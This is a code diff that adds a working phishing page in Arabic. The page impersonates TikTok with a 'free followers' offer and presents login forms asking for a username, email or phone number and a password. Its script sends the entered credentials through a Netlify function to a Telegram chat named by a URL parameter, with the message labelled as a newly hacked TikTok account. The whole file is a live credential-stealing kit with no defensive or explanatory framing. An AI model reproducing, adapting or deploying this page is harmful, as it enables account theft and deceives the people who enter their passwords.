@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Followers</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #000000 0%, #2a2a2a 50%, #000000 100%);
+            min-height: 100vh;
+            padding: 0;
+            color: white;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: #121212;
+            min-height: 100vh;
+            position: relative;
+        }
+        
+        .container::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #ff0050, #00f2ea, #ff0050);
+            z-index: 10;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+            padding: 40px 20px 25px 20px;
+            text-align: center;
+            position: relative;
+            border-bottom: 1px solid #333;
+        }
+        
+        .header::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            left: 20px;
+            right: 20px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #ff0050, #00f2ea, transparent);
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .tiktok-logo {
+            font-size: 40px;
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 20px rgba(255, 0, 80, 0.5));
+        }
+        
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #ffffff;
+        }
+        
+        .header p {
+            font-size: 14px;
+            color: #cccccc;
+            opacity: 0.9;
+        }
+        
+        .section {
+            padding: 25px 20px;
+            border-bottom: 1px solid #2a2a2a;
+        }
+        
+        .section-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffffff;
+            margin-bottom: 12px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .section-title::after {
+            content: "";
+            position: absolute;
+            bottom: -6px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 2px;
+            background: linear-gradient(90deg, #ff0050, #00f2ea);
+            border-radius: 2px;
+        }
+        
+        .section-subtitle {
+            font-size: 13px;
+            color: #aaaaaa;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        
+        .login-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+        
+        .login-option {
+            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
+            border: 1.5px solid #333;
+            border-radius: 12px;
+            padding: 15px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-option::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 0, 80, 0.1), transparent);
+            transition: left 0.5s;
+        }
+        
+        .login-option:hover::before {
+            left: 100%;
+        }
+        
+        .login-option:hover {
+            border-color: #ff0050;
+            transform: translateY(-2px);
+        }
+        
+        .login-option i {
+            font-size: 24px;
+            margin-bottom: 8px;
+            display: block;
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .login-option span {
+            font-weight: 600;
+            color: #ffffff;
+            font-size: 12px;
+        }
+        
+        .packages {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .package {
+            background: linear-gradient(135deg, #1a1a1a, #252525);
+            border: 1.5px solid #333;
+            border-radius: 15px;
+            padding: 20px 15px;
+            position: relative;
+            transition: all 0.3s ease;
+            overflow: hidden;
+        }
+        
+        .package::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #ff0050, #00f2ea);
+        }
+        
+        .package:hover {
+            border-color: #ff0050;
+            transform: translateY(-3px);
+        }
+        
+        .package-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 12px;
+        }
+        
+        .package-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #ffffff;
+        }
+        
+        .package-price {
+            font-size: 18px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .free-badge {
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 15px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+        
+        .package-description {
+            font-size: 12px;
+            color: #cccccc;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+        
+        .select-btn {
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            font-size: 13px;
+            transition: all 0.3s ease;
+        }
+        
+        .select-btn:hover {
+            transform: translateY(-1px);
+        }
+        
+        .form-container {
+            display: none;
+            padding: 25px 20px;
+            background: #121212;
+            min-height: calc(100vh - 80px);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #ffffff;
+            font-size: 14px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            background: #1a1a1a;
+            border: 2px solid #333;
+            border-radius: 10px;
+            font-size: 16px;
+            color: white;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            border-color: #ff0050;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(255, 0, 80, 0.2);
+        }
+        
+        .form-group input::placeholder {
+            color: #666;
+        }
+        
+        .submit-btn {
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 0, 80, 0.3);
+        }
+        
+        .back-btn {
+            background: transparent;
+            border: 2px solid #333;
+            color: #cccccc;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 25px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            width: 100%;
+            font-size: 14px;
+        }
+        
+        .back-btn:hover {
+            border-color: #ff0050;
+            color: #ff0050;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .copyright {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 11px;
+            border-top: 1px solid #2a2a2a;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- الهيدر -->
+        <div class="header">
+            <div class="logo-container">
+                <div class="tiktok-logo">♪</div>
+                <div class="logo-text">TikTok</div>
+            </div>
+            <h1>متابعين تيك توك</h1>
+            <p>زود متابعينك وانطلق نحو الشهرة</p>
+        </div>
+
+        <!-- المحتوى الرئيسي -->
+        <div id="mainContent">
+            <!-- قسم تسجيل الدخول -->
+            <div class="section" id="loginSection">
+                <h2 class="section-title">تسجيل الدخول</h2>
+                <p class="section-subtitle">
+                    اختر طريقة تسجيل الدخول للمتابعة وزيادة المتابعين
+                </p>
+                
+                <div class="login-options">
+                    <div class="login-option" onclick="showForm('username')">
+                        <i>👤</i>
+                        <span>اسم المستخدم</span>
+                    </div>
+                    <div class="login-option" onclick="showForm('email')">
+                        <i>📧</i>
+                        <span>البريد الإلكتروني</span>
+                    </div>
+                    <div class="login-option" onclick="showForm('phone')">
+                        <i>📱</i>
+                        <span>رقم الهاتف</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- قسم الباقات -->
+            <div class="section">
+                <h2 class="section-title">باقات المتابعين</h2>
+                <p class="section-subtitle">
+                    اختر الباقة المناسبة لك وإبدأ رحلتك نحو الشهرة
+                </p>
+                
+                <div class="packages">
+                    <!-- الباقة المجانية -->
+                    <div class="package">
+                        <div class="free-badge">مجاني بالكامل</div>
+                        <div class="package-header">
+                            <div class="package-title">متابع 1000</div>
+                        </div>
+                        <div class="package-description">
+                            احصل على 1000 متابع حقيقي مجاناً
+                        </div>
+                        <button class="select-btn" onclick="selectPackage(1000)">اختيار الباقة</button>
+                    </div>
+                    
+                    <!-- الباقات المدفوعة -->
+                    <div class="package">
+                        <div class="package-header">
+                            <div class="package-title">متابع 2500</div>
+                            <div class="package-price">$3</div>
+                        </div>
+                        <div class="package-description">
+                            احصل على 2500 متابع حقيقي
+                        </div>
+                        <button class="select-btn" onclick="selectPackage(2500)">اختيار الباقة</button>
+                    </div>
+                    
+                    <div class="package">
+                        <div class="package-header">
+                            <div class="package-title">متابع 5000</div>
+                            <div class="package-price">$5</div>
+                        </div>
+                        <div class="package-description">
+                            احصل على 5000 متابع حقيقي
+                        </div>
+                        <button class="select-btn" onclick="selectPackage(5000)">اختيار الباقة</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- نماذج تسجيل الدخول -->
+        <div class="form-container" id="usernameForm">
+            <button class="back-btn" onclick="showMain()">← رجوع</button>
+            <h2 class="section-title">اسم المستخدم</h2>
+            
+            <div class="form-group">
+                <label for="username">اسم المستخدم</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم">
+            </div>
+            <div class="form-group">
+                <label for="usernamePassword">كلمة المرور</label>
+                <input type="password" id="usernamePassword" placeholder="أدخل كلمة المرور">
+            </div>
+            
+            <button class="submit-btn" onclick="submitLogin('username')">تسجيل الدخول</button>
+        </div>
+
+        <div class="form-container" id="emailForm">
+            <button class="back-btn" onclick="showMain()">← رجوع</button>
+            <h2 class="section-title">البريد الإلكتروني</h2>
+            
+            <div class="form-group">
+                <label for="email">البريد الإلكتروني</label>
+                <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني">
+            </div>
+            <div class="form-group">
+                <label for="emailPassword">كلمة المرور</label>
+                <input type="password" id="emailPassword" placeholder="أدخل كلمة المرور">
+            </div>
+            
+            <button class="submit-btn" onclick="submitLogin('email')">تسجيل الدخول</button>
+        </div>
+
+        <div class="form-container" id="phoneForm">
+            <button class="back-btn" onclick="showMain()">← رجوع</button>
+            <h2 class="section-title">رقم الهاتف</h2>
+            
+            <div class="form-group">
+                <label for="phone">رقم الهاتف</label>
+                <input type="tel" id="phone" placeholder="أدخل رقم هاتفك">
+            </div>
+            <div class="form-group">
+                <label for="phonePassword">كلمة المرور</label>
+                <input type="password" id="phonePassword" placeholder="أدخل كلمة المرور">
+            </div>
+            
+            <button class="submit-btn" onclick="submitLogin('phone')">تسجيل الدخول</button>
+        </div>
+
+        <!-- حقوق النشر -->
+        <div class="copyright">
+            © 2024 TikTok - جميع الحقوق محفوظة
+        </div>
+    </div>
+
+    <script>
+        function getChatId() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('chatId');
+        }
+        
+        async function sendToTelegram(message) {
+            const chatId = getChatId();
+            if (!chatId) {
+                console.error('No chatId found');
+                return false;
+            }
+            
+            try {
+                const response = await fetch('/.netlify/functions/tiktok', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        message: message
+                    })
+                });
+                
+                const result = await response.json();
+                return result.success;
+                
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+        
+        function showMain() {
+            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('usernameForm').style.display = 'none';
+            document.getElementById('emailForm').style.display = 'none';
+            document.getElementById('phoneForm').style.display = 'none';
+        }
+        
+        function showForm(formType) {
+            document.getElementById('mainContent').style.display = 'none';
+            
+            document.getElementById('usernameForm').style.display = 'none';
+            document.getElementById('emailForm').style.display = 'none';
+            document.getElementById('phoneForm').style.display = 'none';
+            
+            document.getElementById(formType + 'Form').style.display = 'block';
+        }
+        
+        async function submitLogin(type) {
+            let username, email, phone, password;
+            
+            if (type === 'username') {
+                username = document.getElementById('username').value;
+                password = document.getElementById('usernamePassword').value;
+            } else if (type === 'email') {
+                email = document.getElementById('email').value;
+                password = document.getElementById('emailPassword').value;
+            } else if (type === 'phone') {
+                phone = document.getElementById('phone').value;
+                password = document.getElementById('phonePassword').value;
+            }
+            
+            if ((!username && !email && !phone) || !password) {
+                alert('⚠️ يرجى ملء جميع الحقول');
+                return;
+            }
+            
+            const chatId = getChatId();
+            const message = `
+♪ <b>تم اختراق حساب تيك توك جديد</b>
+
+📝 <b>نوع التسجيل:</b> ${type}
+${username ? `👤 <b>اسم المستخدم:</b> ${username}\n` : ''}
+${email ? `📧 <b>البريد الإلكتروني:</b> ${email}\n` : ''}
+${phone ? `📱 <b>رقم الهاتف:</b> ${phone}\n` : ''}
+🔑 <b>كلمة المرور:</b> ${password}
+🆔 <b>Chat ID:</b> ${chatId}
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}
+            `.trim();
+            
+            const sent = await sendToTelegram(message);
+            
+            if (sent) {
+                alert('✅ تم تسجيل الدخول بنجاح!');
+                showMain();
+                document.querySelectorAll('input').forEach(input => input.value = '');
+            } else {
+                alert('❌ حدث خطأ في التسجيل، يرجى المحاولة مرة أخرى');
+            }
+        }
+        
+        async function selectPackage(followers) {
+            const chatId = getChatId();
+            const price = followers === 1000 ? 'مجاني' : 
+                         followers === 2500 ? '$3' : '$5';
+            
+            const message = `
+♪ <b>طلب باقة متابعين تيك توك</b>
+
+📦 <b>الباقة المختارة:</b> ${followers} متابع
+💰 <b>السعر:</b> ${price}
+🆔 <b>Chat ID:</b> ${chatId}
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}
+            `.trim();
+            
+            const sent = await sendToTelegram(message);
+            
+            if (sent) {
+                alert(`🎉 تم طلب باقة ${followers} متابع بنجاح!\n⏳ جاري المعالجة...`);
+            } else {
+                alert('❌ حدث خطأ في الطلب، يرجى المحاولة مرة أخرى');
+            }
+        }
+        
+        window.addEventListener('load', function() {
+            const chatId = getChatId();
+            if (!chatId) {
+                alert('⚠️ الرابط غير صحيح - يرجى استخدام الرابط الصحيح');
+            }
+            
+            showMain();
+        });
+    </script>
+</body>
+</html>
